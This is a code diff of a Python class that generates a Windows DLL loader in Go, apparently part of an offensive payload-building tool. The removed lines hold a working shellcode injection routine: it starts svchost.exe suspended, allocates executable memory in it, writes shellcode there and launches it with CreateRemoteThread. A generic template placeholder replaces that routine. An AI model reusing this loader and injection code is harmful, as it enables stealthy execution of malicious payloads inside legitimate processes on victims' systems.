@@ -1,13 +1,7 @@
-import tempfile
-import os
-
 from string import Template
 
 class rundll:
-    def __init__(self, arguments):
-        pass
-
-    def __init__(self) -> None:
+    def __init__(self, arguments) -> None:
         with open('dllmain.c', 'w') as f:
             inline_assembly = """
 #include <windows.h>
@@ -49,8 +43,7 @@ BOOL WINAPI DllMain(
             f.write(inline_assembly)
 
     def imports(self) -> list[str]:
-        return ['golang.org/x/sys/windows',
-                'syscall']
+        return ['golang.org/x/sys/windows']
 
     def compilerOptions(self) -> list[str]:
         return []
@@ -72,31 +65,6 @@ func main() {{}}
 //export OnProcessAttach
 func OnProcessAttach() {{
 
-    {transformers}
-
-	// Load DLLs and Procedures
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-
-    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
-    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-    CloseHandle := kernel32.NewProc("CloseHandle")
-
-	procInfo := &windows.ProcessInformation{{}}
-	startupInfo := &windows.StartupInfo{{
-		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
-		ShowWindow: 1,
-	}}
-	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("C:\\\\windows\\\\system32\\\\svchost.exe"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-    
-	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.PAGE_EXECUTE_READWRITE))
-    
-    _ = windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), nil)
-    
-    thread, _, _ := CreateRemoteThread.Call(uintptr(procInfo.Process), 0, uintptr(0), addr, uintptr(0), 0, uintptr(0))
-    
-	WaitForSingleObject.Call(thread, 500)
-	
-    CloseHandle.Call(thread);
+    {template}
 }}
 """
